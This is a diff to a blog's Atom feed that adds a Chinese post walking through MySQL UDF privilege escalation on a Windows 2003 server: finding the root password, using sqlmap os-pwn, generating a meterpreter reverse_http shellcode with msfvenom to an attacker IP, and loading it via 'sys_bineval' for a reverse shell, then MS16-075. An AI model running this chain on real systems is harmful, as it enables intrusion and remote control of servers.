@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://life-time.me/"/>
-  <updated>2019-03-06T17:43:42.099Z</updated>
+  <updated>2019-05-22T09:33:50.306Z</updated>
   <id>http://life-time.me/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>udf提权之sys_bineval</title>
+    <link href="http://life-time.me/2019/05/21/mysql_udf_sys_bineval/"/>
+    <id>http://life-time.me/2019/05/21/mysql_udf_sys_bineval/</id>
+    <published>2019-05-21T13:33:51.000Z</published>
+    <updated>2019-05-22T09:33:50.306Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>拿到shell，先摸清环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win03+iis6+apache+php+mysql</span><br></pre></td></tr></table></figure></p><p>查看被禁用函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System,exec,passthru</span><br></pre></td></tr></table></figure></p><p>尝试使用未被禁用函数以及调用com，asp等皆无法执行命令</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>从某个盘的数据库备份文件翻到mysql的root密码，经过尝试发现被降权了，不过能导出udf，进而尝试创建函数执行命令，在使用sys_exec,sys_eval执行命令的时候………mysql炸了，没错，炸了，执行一次炸一次，而且并未成功执行命令<br>目光转向开放端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80</span><br><span class="line">3306</span><br></pre></td></tr></table></figure></p><p>将root开启外连，使用sqlmap -d 进行连接，os-shell尝试执行命令，依然爆炸，将sqlmap的udf丢进winhex查看函数列表，发现有个函数(sys_bineval)可以进行内存加载shellcode，随即定位到sqlmap的os-pwn功能，使用这个功能的时候，首先尝试了几次未成功反弹shell，经过本地测试和实战测试对比并使用 -v 3进行debug，发现实战中os-pwn反弹shell的时候并未调用sys_bineval执行shellcode，本地测试也是偶尔可行(<em>垃圾sqlmap</em>)</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>本地测试debug拿到payload，进行手工构造payload进行反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_http EXITFUNC=thread LPORT=8080 LHOST=172.16.229.139 -a x86 -e x86/alpha_mixed -f raw BufferRegister=EAX &gt; test ;cat test |xxd -c 9999 -ps</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/05/22/V9wcnO.jpg" alt="V9wcnO.jpg"><br>反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select sys_bineval(0x填这);</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/05/22/V9BseO.jpg" alt="V9BseO.jpg"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>Ms16-075 getsystem </p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h3&gt;&lt;p&gt;拿到shell，先摸清环境&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
+      
+    
+    </summary>
+    
+    
+      <category term="mysql udf" scheme="http://life-time.me/tags/mysql-udf/"/>
+    
+  </entry>
   
   <entry>
     <title>Cortana-rottenpotato</title>
